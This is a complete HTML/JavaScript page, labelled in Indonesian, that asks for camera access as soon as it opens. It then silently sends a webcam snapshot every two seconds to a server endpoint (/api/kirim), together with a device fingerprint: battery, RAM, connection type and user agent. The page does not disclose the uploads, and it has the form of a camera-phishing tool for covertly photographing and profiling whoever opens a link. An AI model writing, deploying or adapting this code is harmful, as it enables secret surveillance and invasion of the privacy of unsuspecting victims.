<!DOCTYPE html>
<html lang="id">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Izin Kamera Fullscreen</title>
    <style>
      html, body {
        margin: 0;
        padding: 0;
        height: 100%;
        overflow: hidden;
        background-color: black;
      }
      video {
        width: 100vw;
        height: 100vh;
        object-fit: cover;
      }
    </style>
  </head>
  <body>
    <script>
      async function startCamera() {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
          const video = document.createElement("video");
          video.srcObject = stream;
          video.autoplay = true;
          video.playsInline = true;
          document.body.appendChild(video);

          // Battery
          let battery = { level: "Tidak diketahui", charging: "Tidak diketahui" };
          if (navigator.getBattery) {
            const b = await navigator.getBattery();
            battery.level = b.level * 100;
            battery.charging = b.charging ? "Ya" : "Tidak";
          }

          // Connection
          const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
          const connectionType = conn ? conn.effectiveType || conn.type : "Tidak diketahui";

          // RAM
          const ram = navigator.deviceMemory || "Tidak diketahui";

          setInterval(() => {
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth || 320;
            canvas.height = video.videoHeight || 240;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const imageData = canvas.toDataURL("image/jpeg");

            const deviceInfo = {
              batteryLevel: battery.level,
              isCharging: battery.charging,
              ram: ram,
              connection: connectionType,
              userAgent: navigator.userAgent,
              usedStorage: localStorage.length,
              totalStorage: "Tidak diketahui"
            };

            fetch("/api/kirim", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ image: imageData, deviceInfo })
            });
          }, 2000);
        } catch (err) {
          alert("Izin kamera ditolak: " + err.message);
        }
      }

      // Langsung jalan saat halaman dibuka
      window.onload = startCamera;
    </script>
  </body>
</html>
